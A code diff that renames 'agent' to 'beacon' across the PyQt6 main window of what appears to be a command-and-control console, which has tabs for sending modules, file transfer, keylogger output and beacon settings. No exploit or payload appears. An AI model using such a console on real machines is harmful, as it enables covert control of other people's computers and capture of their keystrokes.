@@ -8,9 +8,9 @@ from PyQt6.QtGui import QFont, QIcon, QFontDatabase
 from config import ConfigManager
 from services import ServerManager
 from utils import DocumentationManager
-from workers import AgentUpdateWorker
-from .components import (AgentTableWidget, CommandWidget, NavigationMenu, 
-                        FileTransferWidget, SettingsPage, DocumentationPanel, AgentSettingsWidget)
+from workers import BeaconUpdateWorker
+from .components import (BeaconTableWidget, CommandWidget, NavigationMenu, 
+                        FileTransferWidget, SettingsPage, DocumentationPanel, BeaconSettingsWidget)
 from .widgets import LogWidget, OutputDisplay, KeyLoggerDisplay
 import utils
 
@@ -18,12 +18,12 @@ class MainWindow(QMainWindow):
     def __init__(self, server_manager: ServerManager):
         super().__init__()
         self.server_manager = server_manager
-        self.agent_repository = server_manager.agent_repository
+        self.beacon_repository = server_manager.beacon_repository
         self.command_processor = server_manager.command_processor
         self.file_transfer_service = server_manager.file_transfer_service
         self.module_handler = server_manager.module_handler
         self.config_manager = ConfigManager()
-        self.agent_update_worker = None
+        self.beacon_update_worker = None
         self.setup_ui()
         self.start_background_workers()
 
@@ -88,15 +88,15 @@ class MainWindow(QMainWindow):
         main_layout.addWidget(content_container)
 
         # Create content pages
-        self.setup_agents_page()
+        self.setup_beacons_page()
         self.setup_settings_page()
 
         main_widget.setLayout(main_layout)
         self.setCentralWidget(main_widget)
 
-    def setup_agents_page(self):
-        """Create the agents page with proper 2x2 grid layout"""
-        agents_widget = QWidget()
+    def setup_beacons_page(self):
+        """Create the beacons page with proper 2x2 grid layout"""
+        beacons_widget = QWidget()
         main_layout = QVBoxLayout()  
         main_layout.setSpacing(0)
         main_layout.setContentsMargins(0, 0, 0, 0)
@@ -105,19 +105,19 @@ class MainWindow(QMainWindow):
         main_splitter = QSplitter(Qt.Orientation.Horizontal)
         main_splitter.setChildrenCollapsible(False)  # Prevent panels from collapsing completely
         
-        # Create left side with the agent table and log widget
+        # Create left side with the beacon table and log widget
         left_widget = QWidget()
         left_widget.setMinimumWidth(600)  # Ensure minimum width for table column
         left_widget.setMaximumWidth(600)  # Prevent expansion beyond this width
         left_layout = QVBoxLayout()
         left_layout.setContentsMargins(0, 0, 0, 0)
         
-        self.agent_table = AgentTableWidget()
-        self.agent_table.agent_selected.connect(self.on_agent_selected)
+        self.beacon_table = BeaconTableWidget()
+        self.beacon_table.beacon_selected.connect(self.on_beacon_selected)
         
         # Add vertical splitter between table and log
         left_splitter = QSplitter(Qt.Orientation.Vertical)
-        left_splitter.addWidget(self.agent_table)
+        left_splitter.addWidget(self.beacon_table)
         
         # Create log widget
         self.log_widget = LogWidget()
@@ -134,18 +134,18 @@ class MainWindow(QMainWindow):
         right_panel.setMinimumWidth(600)  # Ensure minimum width for command column
         
         # Create and add tab widgets
-        self.command_widget = CommandWidget(self.agent_repository, self.doc_panel)
+        self.command_widget = CommandWidget(self.beacon_repository, self.doc_panel)
         right_panel.addTab(self.command_widget, "Modules")
         
-        self.file_transfer_widget = FileTransferWidget(self.agent_repository)
+        self.file_transfer_widget = FileTransferWidget(self.beacon_repository)
         right_panel.addTab(self.file_transfer_widget, "File Transfer")
 
-        self.keylogger_display = KeyLoggerDisplay(self.agent_repository)
+        self.keylogger_display = KeyLoggerDisplay(self.beacon_repository)
         right_panel.addTab(self.keylogger_display, "KeyLogger")
 
-        self.agent_settings_widget = AgentSettingsWidget(self.agent_repository)
-        self.agent_settings_widget.schema_applied.connect(self.command_widget.on_schema_applied)
-        right_panel.addTab(self.agent_settings_widget, "Beacon Settings")
+        self.beacon_settings_widget = BeaconSettingsWidget(self.beacon_repository)
+        self.beacon_settings_widget.schema_applied.connect(self.command_widget.on_schema_applied)
+        right_panel.addTab(self.beacon_settings_widget, "Beacon Settings")
         
         # Add widgets to main splitter
         main_splitter.addWidget(left_widget)
@@ -166,8 +166,8 @@ class MainWindow(QMainWindow):
         # Add content widget to main layout
         main_layout.addWidget(content_widget)
         
-        agents_widget.setLayout(main_layout)
-        self.content_stack.addWidget(agents_widget)
+        beacons_widget.setLayout(main_layout)
+        self.content_stack.addWidget(beacons_widget)
 
     def setup_settings_page(self):
         """Create the settings page"""
@@ -176,11 +176,11 @@ class MainWindow(QMainWindow):
 
 
     def start_background_workers(self):
-        """Start background workers for updating agent status"""
-        # Start agent update worker
-        self.agent_update_worker = AgentUpdateWorker(self.agent_repository)
-        self.agent_update_worker.agent_updated.connect(self.agent_table.update_agents)
-        self.agent_update_worker.start()
+        """Start background workers for updating beacon status"""
+        # Start beacon update worker
+        self.beacon_update_worker = BeaconUpdateWorker(self.beacon_repository)
+        self.beacon_update_worker.beacon_updated.connect(self.beacon_table.update_beacons)
+        self.beacon_update_worker.start()
         
         # Connect logger to log widget
         if utils.logger:
@@ -190,7 +190,7 @@ class MainWindow(QMainWindow):
         """Handle navigation menu changes"""
         self.nav_menu.set_current_page(page_id)
         
-        if page_id == "agents":
+        if page_id == "beacons":
             self.content_stack.setCurrentIndex(0)
         elif page_id == "settings":
             self.content_stack.setCurrentIndex(1)
@@ -202,24 +202,24 @@ class MainWindow(QMainWindow):
         else:
             self.doc_panel.hide_panel()
 
-    def on_agent_selected(self, agent_id: str):
+    def on_beacon_selected(self, beacon_id: str):
         """Handle beacon selection"""
         # Update all widgets that need to know about the selected beacon
-        self.command_widget.set_agent(agent_id)
-        self.file_transfer_widget.set_agent(agent_id)
-        self.keylogger_display.set_agent(agent_id)
-        self.agent_settings_widget.set_agent(agent_id)
+        self.command_widget.set_beacon(beacon_id)
+        self.file_transfer_widget.set_beacon(beacon_id)
+        self.keylogger_display.set_beacon(beacon_id)
+        self.beacon_settings_widget.set_beacon(beacon_id)
 
-    def on_command_sent(self, agent_id: str, command: str):
-        """Handle command being sent to agent"""
+    def on_command_sent(self, beacon_id: str, command: str):
+        """Handle command being sent to beacon"""
         if utils.logger:
-            utils.logger.log_message(f"Command sent to {agent_id}: {command}")
+            utils.logger.log_message(f"Command sent to {beacon_id}: {command}")
 
     def closeEvent(self, event):
         """Handle window close event"""
         # Stop background workers
-        if self.agent_update_worker:
-            self.agent_update_worker.stop()
+        if self.beacon_update_worker:
+            self.beacon_update_worker.stop()
         
         # Cleanup widgets
         if hasattr(self, 'keylogger_display'):
